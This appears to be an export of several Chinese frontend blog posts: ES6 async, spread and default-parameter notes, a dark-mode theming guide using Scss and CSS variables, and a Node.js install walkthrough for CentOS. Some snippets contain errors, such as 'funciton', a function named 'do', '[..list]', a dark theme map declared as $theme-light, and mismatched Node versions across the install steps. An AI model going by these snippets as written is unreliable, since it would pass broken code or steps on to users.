<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">testAsync</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">"hello async"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> result = <span class="keyword">await</span> testAsync();</span><br><span class="line">    <span class="built_in">console</span>.log(result);</span><br><span class="line">&#125;</span><br><span class="line">test();</span><br></pre></td></tr></table></figure>
<p>await 后接get、post等异步请求，实现请求之后的执行then()的效果：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> param = &#123;&#125;;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">getList</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="keyword">this</span>.axios.post(Api.ACTOR_LIST, param);</span><br><span class="line">    <span class="keyword">if</span> (res.success) &#123;</span><br><span class="line">    <span class="comment">// 对请求结果进行处理</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>多个异步函数时，可使用Promise.all();</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> funciton <span class="keyword">do</span>() &#123;</span><br><span class="line">    <span class="keyword">await</span> <span class="built_in">Promise</span>.all([a(), b(), c()]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">do</span>(); <span class="comment">// 0 1 2</span></span><br></pre></td></tr></table></figure>
<h1 id="…展开运算符"><a href="#…展开运算符" class="headerlink" title="…展开运算符"></a>…展开运算符</h1><p>解构赋值、类数组对象变成数组等功能.</p>
<h2 id="用于函数调用-传参"><a href="#用于函数调用-传参" class="headerlink" title="用于函数调用,传参"></a>用于函数调用,传参</h2><p>以前将数组数据用于函数参数时：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> test = <span class="function">(<span class="params">a, b, c</span>) =&gt;</span> &#123;&#125;;</span><br><span class="line"><span class="keyword">const</span> args = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line">test.apply(<span class="literal">null</span>, args);</span><br></pre></td></tr></table></figure>
<p>有了展开运算符：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> test = <span class="function">(<span class="params">a,b,c</span>) =&gt;</span> &#123;&#125;</span><br><span class="line"><span class="keyword">const</span> args = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>];</span><br><span class="line">test(...args);</span><br></pre></td></tr></table></figure>
<h2 id="用于数组字面量"><a href="#用于数组字面量" class="headerlink" title="用于数组字面量"></a>用于数组字面量</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> arr1 = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>];</span><br><span class="line"><span class="keyword">const</span> arr2 = [...arr1, <span class="string">'d'</span>, <span class="string">'e'</span>]; <span class="comment">// ['a','b','c','d','e']</span></span><br><span class="line"><span class="keyword">const</span> arr3 = [<span class="string">'p'</span>, <span class="string">'o'</span>];</span><br><span class="line">arr1.push(...arr3); <span class="comment">// ['a', 'b', 'c', 'p', 'o']</span></span><br></pre></td></tr></table></figure>
<h2 id="用于解构赋值"><a href="#用于解构赋值" class="headerlink" title="用于解构赋值"></a>用于解构赋值</h2><p>数组赋值</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> [arg1, arg2, ...arg3] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line">arg1 <span class="comment">//1</span></span><br><span class="line">arg2 <span class="comment">//2</span></span><br><span class="line">arg3 <span class="comment">//['3','4']</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123;<span class="number">2</span>: a, <span class="number">3</span>: b&#125; = [<span class="string">"hi"</span>, <span class="string">"he"</span>, <span class="string">"gg"</span>, <span class="string">"aa"</span>];</span><br><span class="line">a <span class="comment">// 数组下标为2的，即"gg"</span></span><br><span class="line">b <span class="comment">// "aa"</span></span><br></pre></td></tr></table></figure>
<p>对象赋值</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;x, y, ...z&#125; = &#123;<span class="attr">x</span>:<span class="number">1</span>, <span class="attr">y</span>:<span class="number">2</span>, <span class="attr">a</span>:<span class="number">3</span>, <span class="attr">b</span>:<span class="number">4</span>&#125;;</span><br><span class="line">x; <span class="comment">//1</span></span><br><span class="line">y; <span class="comment">//2</span></span><br><span class="line">z; <span class="comment">//&#123;a:3,b:4&#125;</span></span><br></pre></td></tr></table></figure>
<p>注：此时展开运算符必须放在数组或对象最后。<br>合并对象</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = &#123;<span class="attr">x</span>:<span class="number">1</span>, <span class="attr">y</span>:<span class="number">2</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> b = &#123;<span class="attr">z</span>:<span class="number">3</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> ab = &#123;...a, ...b&#125;;</span><br><span class="line">ab <span class="comment">// &#123;x:1,y:2,z:3&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="类数组对象变成数组"><a href="#类数组对象变成数组" class="headerlink" title="类数组对象变成数组"></a>类数组对象变成数组</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> list=<span class="built_in">document</span>.getElementsByTagName(<span class="string">'div'</span>);</span><br><span class="line"><span class="keyword">const</span> arr=[..list];</span><br></pre></td></tr></table></figure>
<h1 id="函数参数默认值"><a href="#函数参数默认值" class="headerlink" title="函数参数默认值"></a>函数参数默认值</h1><p>函数参数有默认值的情况下，先取赋值，无则取默认值；</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> foo = <span class="function">(<span class="params">height = <span class="number">50</span>, color = <span class="string">'red'</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(height, color);</span><br><span class="line">&#125;</span><br><span class="line">foo(); <span class="comment">// 50, "red"</span></span><br><span class="line">foo(<span class="number">100</span>, <span class="string">"yellow"</span>); <span class="comment">// 100, "yellow"</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>es6/7</tag>
      </tags>
  </entry>
  <entry>
    <title>前端变色方案</title>
    <url>/2020/05/%E5%89%8D%E7%AB%AF%E5%8F%98%E8%89%B2%E6%96%B9%E6%A1%88.html</url>
    <content><![CDATA[<p>随着IOS深色模式的普及，众多App支持了白天/深色主题。当然Web页面也可以做到。</p>
<p><img src="https://static.simmzl.cn/blog/v2/imgs/dark_mode.png" alt="dark_mode"></p>
<a id="more"></a>
<h2 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h2><p>变色的核心，是色值和背景图的改变，以下是一些实现方案：</p>
<h3 id="CSS滤镜-filter-brightness"><a href="#CSS滤镜-filter-brightness" class="headerlink" title="CSS滤镜 filter: brightness()"></a>CSS滤镜 filter: brightness()</h3><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/filter-function/brightness" target="_blank" rel="noopener">brightness() - CSS（层叠样式表） | MDN</a></p>
<p>懒人做法，可以通过改变<code>&lt;html&gt;</code>标签即整个页面的输出亮度实现夜晚变暗的效果，值为0-1，0表示全黑。效果上其实就是加了个黑色带透明度的蒙层。</p>
<p>简单粗暴、效果单一，兼容性尚可。但是有个坑，即元素<code>background</code>不能为<code>none</code>或透明，否则<code>brightness()</code>无效果。</p>
<p><img src="https://static.simmzl.cn/blog/v2/imgs/brightness.png" alt="brightness"></p>
<p>效果：</p>
<div class="iframe-container"><br>  <iframe class="no-click" src="https://www.apple.com.cn/apple-music/" scrolling="no" height="595px" width="335px"></iframe><br>  <iframe class="no-click" src="https://www.apple.com.cn/apple-music/" scrolling="no" height="595px" width="335px" style="filter: brightness(0.5); background: #fff"></iframe><br></div>

<h3 id="JS变量"><a href="#JS变量" class="headerlink" title="JS变量"></a>JS变量</h3><p>配置js全局变量存储颜色，写内联样式</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> theme = &#123;</span><br><span class="line">  color: <span class="string">"yellow"</span>,</span><br><span class="line">  backgroundColor: <span class="string">"green"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> mode = <span class="string">"dark"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理图片</span></span><br><span class="line"><span class="keyword">get</span> themeStyle() &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="comment">// 通过图片命名来区分不同主题</span></span><br><span class="line">    backgroundImage: <span class="built_in">require</span>(<span class="string">`./assets/icon-name-<span class="subst">$&#123;mode&#125;</span>.png`</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">:style</span>=<span class="string">"&#123; color: theme.color &#125;"</span>&gt;</span>text<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">:style</span>=<span class="string">"themeStyle"</span>&gt;</span>text<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>优点： 无兼容性</p>
<p>缺点：除了写起来很麻烦，在处理图片时，为了兼容明暗两种图片，需要单独处理一次，工作量大且不易维护。不建议使用。</p>
<h3 id="Sass-Less-Stylus等预编译器函数"><a href="#Sass-Less-Stylus等预编译器函数" class="headerlink" title="Sass/Less/Stylus等预编译器函数"></a>Sass/Less/Stylus等预编译器函数</h3><p>通过预编译器变量和函数生成多套主题CSS，这里以Scss为例</p>
<h4 id="定义Scss变量"><a href="#定义Scss变量" class="headerlink" title="定义Scss变量"></a>定义Scss变量</h4><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="comment">// variable.scss</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 主题色</span></span><br><span class="line"><span class="variable">$color-primary</span>: <span class="number">#25d4d0</span>;</span><br><span class="line"><span class="variable">$color-primary-dark</span>: <span class="number">#20a6af</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$color-warning</span>: <span class="number">#fe6063</span>;</span><br><span class="line"><span class="variable">$color-warning-dark</span>: <span class="number">#fe6f63</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$color-white</span>: <span class="number">#fff</span>;</span><br><span class="line"><span class="variable">$color-white-dark</span>: <span class="number">#12121f</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$color-text-default</span>: <span class="number">#474747</span>;</span><br><span class="line"><span class="variable">$color-text-default-dark</span>: <span class="number">#686881</span>;</span><br></pre></td></tr></table></figure>
<h4 id="定义主题map"><a href="#定义主题map" class="headerlink" title="定义主题map"></a>定义主题map</h4><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="comment">// theme.scss</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 白天模式色值map</span></span><br><span class="line"><span class="variable">$theme-light</span>: (</span><br><span class="line">  // 背景色</span><br><span class="line">  bg-default: <span class="variable">$color-white</span>,</span><br><span class="line">  // 边框色</span><br><span class="line">  border-primary: <span class="variable">$color-primary</span>,</span><br><span class="line">  // 文本色</span><br><span class="line">  text-default: <span class="variable">$color-text-default</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 深色模式色值map</span></span><br><span class="line"><span class="variable">$theme-light</span>: (</span><br><span class="line">  // 背景色</span><br><span class="line">  bg-default: <span class="variable">$color-white-dark</span>,</span><br><span class="line">  // 边框色</span><br><span class="line">  border-primary: <span class="variable">$color-primary-dark</span>,</span><br><span class="line">  // 文本色</span><br><span class="line">  text-default: <span class="variable">$color-text-default-dark</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主题名map</span></span><br><span class="line"><span class="variable">$themes</span>: (</span><br><span class="line">  light: <span class="variable">$theme-light</span>,</span><br><span class="line">  dark: <span class="variable">$theme-dark</span>,</span><br><span class="line">  ...</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h4 id="mixin-方法生成多种主题样式"><a href="#mixin-方法生成多种主题样式" class="headerlink" title="mixin 方法生成多种主题样式"></a>mixin 方法生成多种主题样式</h4><h5 id="处理颜色"><a href="#处理颜色" class="headerlink" title="处理颜色"></a>处理颜色</h5><p>参数：</p>
<ul>
<li><code>$type</code> 颜色相关属性，默认为<code>background-color</code>，可以是<code>color</code>，<code>border-color</code></li>
<li><code>$typeColor</code> 色值，为主题模式色值map中的key，默认<code>bg-default</code></li>
<li><code>$alpha</code> 透明度，<code>值为 0-1</code></li>
</ul>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@mixin</span> setThemes(<span class="variable">$type</span>: background-color, <span class="variable">$typeColor</span>: <span class="string">'bg-default'</span>, <span class="variable">$alpha</span>: <span class="number">1</span>) &#123;</span><br><span class="line">  <span class="keyword">@each</span> <span class="variable">$themename</span>, <span class="variable">$theme</span> in <span class="variable">$themes</span> &#123;</span><br><span class="line">    <span class="selector-class">.theme-</span>#&#123;<span class="variable">$themename</span>&#125; &amp; &#123;</span><br><span class="line">      #&#123;<span class="variable">$type</span>&#125;: rgba(map-get(<span class="variable">$map</span>: <span class="variable">$theme</span>, <span class="variable">$key</span>: <span class="variable">$typeColor</span>), <span class="variable">$alpha</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用：</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.header</span> &#123;</span><br><span class="line">  <span class="keyword">@include</span> setThemes(color, text-default);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终生成：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.theme-light</span> <span class="selector-class">.header</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#474747</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.theme-dark</span> <span class="selector-class">.header</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#686881</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="处理图片"><a href="#处理图片" class="headerlink" title="处理图片"></a>处理图片</h5><p>图片也存在深色模式时，通过图片命名来区分：</p>
<blockquote>
<p>icon-success-light.png</p>
<p>icon-success-dark.png</p>
</blockquote>
<p>参数：</p>
<ul>
<li><code>$imgUrl</code> 图片地址前缀</li>
<li><code>$imgType</code> 图片格式后缀，默认<code>png</code></li>
</ul>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置背景</span></span><br><span class="line"><span class="keyword">@mixin</span> setThemesBgImg(<span class="variable">$imgUrl</span>, <span class="variable">$imgType</span>: <span class="string">'png'</span>) &#123;</span><br><span class="line">  <span class="keyword">@each</span> <span class="variable">$themename</span>, <span class="variable">$theme</span> in <span class="variable">$themes</span> &#123;</span><br><span class="line">    <span class="selector-class">.theme-</span>#&#123;<span class="variable">$themename</span>&#125; &amp; &#123;</span><br><span class="line">      <span class="keyword">@if</span> <span class="variable">$imgUrl</span> &#123;</span><br><span class="line">        <span class="attribute">background-image</span>: url(#&#123;<span class="variable">$imgUrl</span>&#125;-#&#123;<span class="variable">$themename</span>&#125;.#&#123;<span class="variable">$imgType</span>&#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用：</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.header</span> &#123;</span><br><span class="line">  <span class="keyword">@include</span> setThemesBgImg(<span class="string">'./assets/icon-success'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.footer</span> &#123;</span><br><span class="line">  <span class="keyword">@include</span> setThemesBgImg(<span class="string">'./assets/icon-success'</span>, gif);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终生成：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.theme-light</span> <span class="selector-class">.header</span> &#123;</span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">'./assets/icon-success-light.png'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.theme-dark</span> <span class="selector-class">.header</span> &#123;</span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">'./assets/icon-success-dark.png'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.theme-light</span> <span class="selector-class">.footer</span> &#123;</span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">'./assets/icon-success-light.gif'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.theme-dark</span> <span class="selector-class">.footer</span> &#123;</span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">'./assets/icon-success-dark.gif'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同理也可以处理<code>box-shadow</code>。</p>
<h5 id="特殊情况"><a href="#特殊情况" class="headerlink" title="特殊情况"></a>特殊情况</h5><p>当遇到无法处理的情况，如白天有<code>box-shadow</code>，夜晚没有。这时候需要<strong>手动处理</strong>：</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.header</span> &#123;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">8px</span> <span class="number">16px</span> <span class="number">0</span> rgba(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.10</span>);</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.theme-night</span> &amp; &#123;</span><br><span class="line">    <span class="attribute">box-shadow</span>: none;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="改变主题"><a href="#改变主题" class="headerlink" title="改变主题"></a>改变主题</h4><p>通过改变根DOM的class来应用主题</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"theme-light"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">header</span>&gt;</span><span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"theme-dark"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">header</span>&gt;</span><span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h4><p>优点： scss最终输出成css，通过该方法实现变色<strong>无兼容性问题</strong>，且<strong>切换主题方便</strong>，<strong>处理图片</strong>也毫不费力。</p>
<p>缺点： 但当主题非常多时，会生成很多主题样式代码，全部打到包里，造成<strong>样式代码冗余</strong>，即使用户并不用这些主题。</p>
<h3 id="CSS变量"><a href="#CSS变量" class="headerlink" title="CSS变量"></a>CSS变量</h3><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Using_CSS_custom_properties" target="_blank" rel="noopener">使用CSS变量 - CSS（层叠样式表） | MDN</a></p>
<h4 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h4><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-pseudo">:root</span> &#123;</span><br><span class="line">  <span class="attribute">--color</span>: <span class="number">#fff</span>;</span><br><span class="line">  <span class="attribute">--bgColor</span>: <span class="number">#25d4d0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.header</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">var</span>(--color);</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">var</span>(--bgColor);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="CSS变量存储在类名下"><a href="#CSS变量存储在类名下" class="headerlink" title="CSS变量存储在类名下"></a>CSS变量存储在类名下</h4><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="variable">$theme-light</span>: (</span><br><span class="line">  bg-default: <span class="number">#fff</span>,</span><br><span class="line">  border-default: <span class="number">#ededed</span>,</span><br><span class="line">  text-default: <span class="number">#282828</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$theme-dark</span>: (</span><br><span class="line">  bg-default: <span class="number">#1f1f29</span>,</span><br><span class="line">  border-default: <span class="number">#393941</span>,</span><br><span class="line">  text-default: <span class="number">#d7d7e1</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$themes</span>: (</span><br><span class="line">  light: <span class="variable">$theme-light</span>,</span><br><span class="line">  dark: <span class="variable">$theme-dark</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">@each</span> <span class="variable">$themename</span>, <span class="variable">$theme</span> in <span class="variable">$themes</span> &#123;</span><br><span class="line">  <span class="selector-class">.theme-</span>#&#123;<span class="variable">$themename</span>&#125; &#123;</span><br><span class="line">    <span class="keyword">@each</span> <span class="variable">$key</span>, <span class="variable">$value</span> in <span class="variable">$theme</span> &#123;</span><br><span class="line">      --#&#123;<span class="variable">$key</span>&#125;: #&#123;<span class="variable">$value</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>最终生成：</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.theme-light</span> &#123;</span><br><span class="line">  <span class="attribute">--bg-default</span>: <span class="number">#fff</span>;</span><br><span class="line">  <span class="attribute">--border-default</span>: <span class="number">#ededed</span>;</span><br><span class="line">  <span class="attribute">--text-default</span>: <span class="number">#282828</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.theme-dark</span> &#123;</span><br><span class="line">  <span class="attribute">--bg-default</span>: <span class="number">#1f1f29</span>;</span><br><span class="line">  <span class="attribute">--border-default</span>: <span class="number">#393941</span>;</span><br><span class="line">  <span class="attribute">--text-default</span>: <span class="number">#d7d7e1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="支持可变背景图片"><a href="#支持可变背景图片" class="headerlink" title="支持可变背景图片"></a>支持可变背景图片</h4><p>由于CSS变量不支持写路径，所以背景图片可变时，需要结合上面的Scss方案，使用上面提到的Scss的 <code>setThemesBgImg</code> mixin方法</p>
<h4 id="改变主题-1"><a href="#改变主题-1" class="headerlink" title="改变主题"></a>改变主题</h4><p>所有变量都控制在了不同类名下，因此仅需更改类名即可：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> ThemeName = <span class="string">'light'</span> | <span class="string">'dark'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> changeTheme = <span class="function">(<span class="params">mode: ThemeName</span>) =&gt;</span> &#123;</span><br><span class="line">  mode = [<span class="string">'light'</span>, <span class="string">'dark'</span>].includes(mode) ? mode : <span class="string">'light'</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> classList = [...document.body.classList]</span><br><span class="line">  <span class="keyword">if</span> (~classList.findIndex(<span class="function"><span class="params">i</span> =&gt;</span> ~i.indexOf(<span class="string">'theme-'</span>))) &#123;</span><br><span class="line">    <span class="comment">// 存在其他主题class则替换</span></span><br><span class="line">    <span class="built_in">document</span>.body.className = classList</span><br><span class="line">      .map(<span class="function"><span class="params">i</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (~i.indexOf(<span class="string">'theme-'</span>)) i = <span class="string">`theme-<span class="subst">$&#123;mode&#125;</span>`</span></span><br><span class="line">        <span class="keyword">return</span> i</span><br><span class="line">      &#125;)</span><br><span class="line">      .join(<span class="string">' '</span>)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 不存在其他主题class则添加新主题class</span></span><br><span class="line">    <span class="built_in">document</span>.body.classList.add(<span class="string">`theme-<span class="subst">$&#123;mode&#125;</span>`</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123; ThemeName &#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> changeTheme</span><br></pre></td></tr></table></figure>
<p>优点：</p>
<p>通过js动态改变css变量的好处之一，就是可以通过服务端接口获取主题变量色值，通过后台可配置无限种主题，且不会产生冗余的CSS代码。</p>
<p>缺点：</p>
<ul>
<li>不能支持可变背景图片，仍需scss方法支持图片</li>
<li>兼容性堪忧，尤其是国内的环境……</li>
</ul>
<p><img src="https://static.simmzl.cn/blog/v2/imgs/css_var.png" alt="css_var"></p>
<p>但是Apple官网用了。</p>
<p><img src="https://static.simmzl.cn/blog/v2/imgs/apple.png" alt="apple"></p>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>在主题不多时，如仅有<strong>白天&amp;深色模式</strong>，适合用<code>预编译器方案</code>;</p>
<p>在主题很多，且不考虑完美兼容性时（如国际C端），用 <strong>css变量写颜色 + Scss方法写背景图</strong>；</p>
<p>在主题很多且考虑兼容性时（如国内C端），使用<code>预编译器方案</code>写样式。再开发一个webpack打包插件把单个主题样式代码抽离出来打包成单文件，切换主题时动态加载样式文件。</p>
]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title>在centos上安装node.js</title>
    <url>/2017/10/%E5%9C%A8centos%E4%B8%8A%E5%AE%89%E8%A3%85node.js.html</url>
    <content><![CDATA[<p>我的云服务器是centos 6.8 64位，最近需要在服务器上跑node.js程序，所以安装了node.js，网上有很多办法，试了一些，有些没用，踩了一点坑，总结一下。<br><a id="more"></a></p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="下载node-js包"><a href="#下载node-js包" class="headerlink" title="下载node.js包"></a>下载node.js包</h2><p>首先通过wget下载node.js包，因为服务器是64位，所以在官网选择64位的版本下载链接；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#wget https://nodejs.org/dist/v6.10.1/node-v6.10.1-linux-x64.tar.xz</span></span><br></pre></td></tr></table></figure>
<h2 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#tar xvf node-v0.12.0.tar.gz</span></span><br></pre></td></tr></table></figure>
<h2 id="进入目录"><a href="#进入目录" class="headerlink" title="进入目录"></a>进入目录</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cd node-v4.2.3-linux-x86/bin</span></span><br><span class="line"><span class="comment">#node -v</span></span><br><span class="line">//v4.2.3 成功！</span><br></pre></td></tr></table></figure>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>要想全局使用还需要配置连接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ln -s /root/node-v4.2.3-linux-x86/bin/node /usr/local/bin/node</span></span><br><span class="line"><span class="comment"># ln -s /root/node-v4.2.3-linux-x86/bin/npm /usr/local/bin/npm</span></span><br></pre></td></tr></table></figure>
<p>然后在根目录测试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#node -v</span></span><br><span class="line">//v4.2.3 成功！</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>centos</tag>
        <tag>node</tag>
      </tags>
  </entry>
  <entry>
    <title>对象属性的删除、判断、遍历操作</title>
    <url>/2017/10/%E5%AF%B9%E8%B1%A1%E5%B1%9E%E6%80%A7%E7%9A%84%E5%88%A0%E9%99%A4%E3%80%81%E5%88%A4%E6%96%AD%E3%80%81%E9%81%8D%E5%8E%86%E6%93%8D%E4%BD%9C.html</url>
    <content><![CDATA[<blockquote>
